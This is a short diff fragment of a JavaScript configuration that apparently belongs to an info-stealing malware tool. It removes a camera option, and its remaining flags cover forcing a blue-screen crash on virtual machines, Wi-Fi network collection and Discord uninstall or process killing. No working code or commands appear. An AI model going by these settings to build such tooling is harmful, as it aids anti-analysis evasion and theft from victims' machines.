@@ -14,7 +14,6 @@ module.exports = {
   bsodIfVm: true,
   fakeError: false,
   wifiNetworks: false,
-  camera: true,
   discord: {
     uninstall: false,
     killProcess: false,
